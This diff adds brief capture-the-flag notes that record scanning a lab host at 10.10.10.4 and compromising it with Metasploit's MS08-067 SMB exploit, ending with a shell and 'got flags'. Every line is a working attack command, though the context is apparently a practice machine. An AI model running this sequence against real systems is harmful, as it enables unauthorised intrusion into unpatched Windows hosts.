@@ -1,0 +1,16 @@
+nmap -T4 -A --top-ports 500 -oN nmap.txt 10.10.10.4
+msfconsole
+search smb_ver
+use auxiliary/scanner/smb/smb_version
+options
+set rhosts 10.10.10.4
+run
+# google windows xp sp3 smb
+search ms08
+use windows/smb/ms08_067_netapi
+options
+set rhosts 10.10.10.4
+run
+# shell!
+shell
+# got flags
